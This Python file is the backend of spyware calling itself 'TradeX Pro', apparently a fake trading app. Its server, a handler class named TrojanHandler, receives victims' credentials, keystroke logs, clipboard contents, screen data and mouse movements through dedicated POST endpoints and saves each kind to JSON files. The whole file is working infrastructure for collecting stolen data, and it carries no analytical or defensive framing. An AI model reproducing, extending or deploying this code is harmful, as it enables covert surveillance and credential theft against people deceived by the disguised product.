#!/usr/bin/env python3
"""
TradeX Pro - Spyware Backend Server
Captures credentials, keylog, clipboard, screen, mouse movements
"""
import http.server
import json
import os
import time
from datetime import datetime
from urllib.parse import urlparse

# Data storage
data_store = {
    "credentials": [],
    "keylog": [],
    "clipboard": [],
    "screen": [],
    "mouse": [],
    "visibility": [],
    "exits": [],
    "sessions": []
}

class TrojanHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())
        elif self.path == "/css/style.css":
            self.send_response(200)
            self.send_header("Content-type", "text/css")
            self.end_headers()
            with open("css/style.css", "rb") as f:
                self.wfile.write(f.read())
        elif self.path.startswith("/js/"):
            self.send_response(200)
            self.send_header("Content-type", "application/javascript")
            self.end_headers()
            with open(self.path[1:], "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        
        if self.path == "/collect":
            data = json.loads(body)
            data["captured_at"] = datetime.now().isoformat()
            data_store["credentials"].append(data)
            self.save_data()
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "captured"}).encode())
            
        elif self.path == "/keylog":
            data = json.loads(body)
            data_store["keylog"].extend(data.get("keys", []))
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/clipboard":
            data = json.loads(body)
            data["captured_at"] = datetime.now().isoformat()
            data_store["clipboard"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/screen":
            data = json.loads(body)
            data["captured_at"] = datetime.now().isoformat()
            data_store["screen"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/mouse":
            data = json.loads(body)
            data_store["mouse"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/visibility":
            data = json.loads(body)
            data["timestamp"] = datetime.now().isoformat()
            data_store["visibility"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        elif self.path == "/exit":
            data = json.loads(body)
            data["exit_time"] = datetime.now().isoformat()
            data_store["exits"].append(data)
            self.save_data()
            self.send_response(200)
            self.end_headers()
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")
    
    def save_data(self):
        """Save all captured data to files"""
        os.makedirs("data", exist_ok=True)
        
        if data_store["credentials"]:
            with open("data/credentials.json", "w") as f:
                json.dump(data_store["credentials"], f, indent=2)
        
        if data_store["keylog"]:
            with open("data/keylog.json", "w") as f:
                json.dump(data_store["keylog"], f, indent=2)
        
        if data_store["clipboard"]:
            with open("data/clipboard.json", "w") as f:
                json.dump(data_store["clipboard"], f, indent=2)
        
        if data_store["screen"]:
            with open("data/screens.json", "w") as f:
                json.dump(data_store["screen"], f, indent=2)
        
        if data_store["mouse"]:
            with open("data/mouse.json", "w") as f:
                json.dump(data_store["mouse"], f, indent=2)
        
        if data_store["visibility"]:
            with open("data/visibility.json", "w") as f:
                json.dump(data_store["visibility"], f, indent=2)
        
        if data_store["exits"]:
            with open("data/exits.json", "w") as f:
                json.dump(data_store["exits"], f, indent=2)

if __name__ == "__main__":
    PORT = 9000
    server = http.server.HTTPServer(("0.0.0.0", PORT), TrojanHandler)
    print(f"🦇 TradeX Pro Spyware Server running on port {PORT}")
    print(f"📊 Data stored in: data/")
    print(f"🔍 Monitor: http://localhost:{PORT}")
    server.serve_forever()
